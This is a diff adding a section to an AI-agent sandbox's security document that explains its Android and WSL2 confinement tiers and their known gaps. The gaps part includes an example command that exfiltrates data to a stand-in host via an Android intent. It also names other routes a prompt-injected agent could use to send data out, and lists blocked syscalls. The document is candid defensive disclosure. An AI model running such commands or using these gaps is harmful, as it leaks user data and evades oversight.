@@ -34,6 +34,50 @@ The realistic risk is **not** "someone on the internet connects to port 4589." I
 - **Keys:** AES-256-GCM at rest, 0600 secret, last-4 only. Honest limit: decryptable by design (the app must send keys to providers).
 - **Deterministic checkers:** exact membership (not substring), safe arithmetic (no `eval`), constrained decoding.
 
+<!-- BEGIN confinement-tiers (generated from server/src/sandbox/tiers.js) -->
+## Confinement tiers — what each one actually enforces
+
+Atlan compiles a small launcher (`server/native/atlan-confine.c`) at first use and measures what THIS device will enforce **by attempting every operation on this boot** — never by reading a flag file. That rule is not fastidiousness: `/sys/kernel/security/lsm` reads `n/a` on hosts where Landlock is actively enforcing, and `/proc/sys/user/max_user_namespaces` is registered unconditionally by `kernel/ucount.c` with no `CONFIG_USER_NS` guard, so it reads a large positive number on a kernel built *without* user namespaces. A run declares the tier it needs; if the device establishes less, **the run does not start** and the Doctor names the rung that said no.
+
+These sentences live in `server/src/sandbox/tiers.js` and are quoted here verbatim. `test/docdrift.mjs` fails the commit that lets the two diverge.
+
+### T0 — no confinement established
+
+**No OS confinement on this run.** The agent runs as your user with no syscall filter and no filesystem boundary. It is working in a disposable copy of your project and nothing reaches your real tree until you approve a diff — that is containment against error, not against attack. This run was explicitly allowed to start ungated.
+
+### T1 — capability removal (the phone, today)
+
+**Capability removal, enforced by the kernel.** Before this agent started, Atlan installed a syscall filter it cannot remove and that every process it spawns inherits. It cannot use `io_uring`, `ptrace`, `process_vm_writev`, `pidfd_getfd`, `userfaultfd`, `bpf`, `perf_event_open`, `keyctl`, `unshare`, `setns`, `mount`, or the 32-bit syscall table.
+
+**It does not confine the filesystem.** On an unrooted Android device there is no filesystem boundary available to an app — not to Atlan, not to anything. This agent can still read every file your Termux user can read, including the other agent CLIs' saved logins. Its writes go to a disposable copy and nothing reaches your project until you approve a diff.
+
+**This is capability removal plus containment against error. It is not a sandbox.**
+
+### T2 — capability removal + egress denial (Bash children, any host)
+
+**Everything in T1, and this shell cannot open a network socket.** `socket()` is refused by the kernel for every address family, including AF_UNIX — so it cannot reach the internet, cannot reach Atlan's own cockpit on loopback, and cannot smuggle data out through Android's DNS resolver socket. The refusal is inherited by anything it starts.
+
+**This applies to shell commands the agent runs. It does not apply to the agent itself** — an agent CLI is the thing talking to the model provider, so its own connection stays open by necessity.
+
+### T3 — capability removal + egress + filesystem (accessory node)
+
+**Everything above, and a real filesystem boundary.** Paths outside this workspace and its toolchain do not resolve for this agent — the kernel refuses at `open()`, and the refusal is inherited by every process it starts. Only this engine's own saved login is readable; the other CLIs' tokens, your SSH keys and Atlan's key store are outside the grant.
+
+**Honest limits:** it does not cover file descriptors the agent was handed at startup, it does not hook `stat`/`chmod`/`chown`, and a network-capable process inside the boundary can still send out what it can read.
+
+### When the probe says no to Landlock
+
+**Filesystem confinement: unavailable on this device.** Not disabled, not skipped — Android's own app syscall filter kills the calls that would create it. Atlan checks by attempting it every boot; if a future Android permits it, this turns green without a code change.
+
+### Measured, and not yet measured
+
+**WSL2 accessory node, 2026-08-05: 15/15 rungs green, established T3.** The PHONE numbers are **unmeasured**. `declaredTier()` therefore defaults to **T0 on every host** until an on-device transcript is attached — and T0 is not a silent degrade, it says out loud that the run was explicitly allowed to start ungated. Raising the phone default is a commit that carries a phone ladder transcript, not a config change.
+
+**Not covered in v1**, named here so nobody assumes coverage the code does not have: `build.js:71` (`bash -c script`), `pty.js:46` (Term tab) and `studio.js:72` still spawn unwrapped. IP-1 egress stays open **by necessity** — an agent CLI is the process talking to the model provider — so a prompt-injected agent still has a bidirectional channel to a host we blessed; nothing here sees Binder (`am start -a android.intent.action.VIEW -d https://evil/?data` exfiltrates through another UID with no socket call at all), and a write into shared storage leaves via a sync app. Those holes stay open and none of the strings above imply otherwise.
+
+**This is not a sandbox on the phone, and no amount of this code makes one.** There is no filesystem boundary available to an unrooted Android app. `CONFIG_USER_NS` is default-n and absent from every GKI arm64 defconfig 5.10→6.12, `CONFIG_PID_NS` is explicitly unset, and `mount`/`umount2`/`chroot` are SIGSYS-killed by the inherited zygote filter — so the bubblewrap family is not weak there, it is absent, and writing code against namespaces for Android is writing code that cannot execute. proot is ptrace path rewriting at the same uid under the same inherited filter and grants zero capabilities; it is never part of the boundary.
+
+<!-- END confinement-tiers -->
 ## Known gaps — status verified 2026-08-02
 
 Each carries its real state. "Partial" means a vector was closed and a narrower one remains; saying "open" for those understates work already done, and saying "closed" would overstate it.
